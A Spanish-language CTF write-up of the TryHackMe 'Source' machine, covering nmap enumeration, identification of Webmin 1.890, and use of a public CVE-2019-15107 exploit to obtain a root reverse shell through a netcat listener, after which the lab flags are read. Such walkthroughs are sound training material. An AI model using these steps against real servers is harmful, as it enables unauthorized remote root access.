---
title: TryHackMe Source Writeup
published: true
---

La máquina Source, es una máquina de TryHackMe en la que mediante la explotación de esta conseguiremos la flag del usuario y la de root.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 11:51 EDT
Initiating Ping Scan at 11:51
Scanning 10.10.250.186 [2 ports]
Completed Ping Scan at 11:51, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 11:51
Scanning 10.10.250.186 [65535 ports]
Discovered open port 22/tcp on 10.10.250.186
Discovered open port 10000/tcp on 10.10.250.186
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 47.85% done; ETC: 11:51 (0:00:09 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 58.44% done; ETC: 11:51 (0:00:07 remaining)
Completed Connect Scan at 11:51, 19.14s elapsed (65535 total ports)
Nmap scan report for 10.10.250.186
Host is up, received conn-refused (0.085s latency).
Scanned at 2022-10-31 11:51:37 EDT for 19s
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack
10000/tcp open  snet-sensor-mgmt syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds

```

Tenemos dos puertos abiertos, analizaremos la versión y servicio de los mismos con nmap para intentar sacar más información:

```bash
10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 4FA8BA4E84787AE07428D2D6098B85E7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos centraremos en el puerto 10000. Podemos observar que se trata de la versión 1.890 de MiniServ (Webmin).

Al entrar en un buscador bajo https://$IP-VICTIMA:10000 nos reporta un panel de autentificación bajo Webmin. Buscamos: Webmin 1.890 exploit. Vemos que hay una vulnerabilidad registrada (CVE-2019–15107).

Al buscar exploit github (CVE-2019–15107) nos salen unas cuantas, me quedaré con la de <a href="https://github.com/MuirlandOracle/CVE-2019-15107">Muirland Oracle.</a>

Nos clonamos el repositorio en nuestro sistema con:

> git clone https://github.com/MuirlandOracle/CVE-2019-15107

Ejecutamos el exploit con python3 indicando el puerto y la IP-VICTIMA y seguimos los pasos que nos indican:

```bash
❯ python3 CVE-2019-15107.py -p10000 10.10.250.186

        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                  
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                    
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                   
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                   
                                                                                                     
                                                @MuirlandOracle                                      
                                                                                                     
                                                                                                     
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.10.250.186:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                   
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# shell

[*] Starting the reverse shell process
[*] For UNIX targets only!
[*] Use 'exit' to return to the pseudoshell at any time
Please enter the IP address for the shell: 10.8.4.179
Please enter the port number for the shell: 1234

[*] Start a netcat listener in a new window (nc -lvnp 1234) then press enter.

[+] You should now have a reverse shell on the target
[*] If this is not the case, please check your IP and chosen port
If these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53
```

Mientras tanto en nuestro netcat hemos ganado acceso al sistema como root en la que fácilmente podemos llegar a obtener las dos flags:

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.250.186] 40948
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /home
# ls
dark
# cd dark
# ls
user.txt
webmin_1.890_all.deb
# cat user.txt
THM{??????????????}
# cd /root
# ls
root.txt
# cat root.txt
THM{?????????????}
# 
```

Muchas gracias por leer este writeup, espero que te haya gustado!
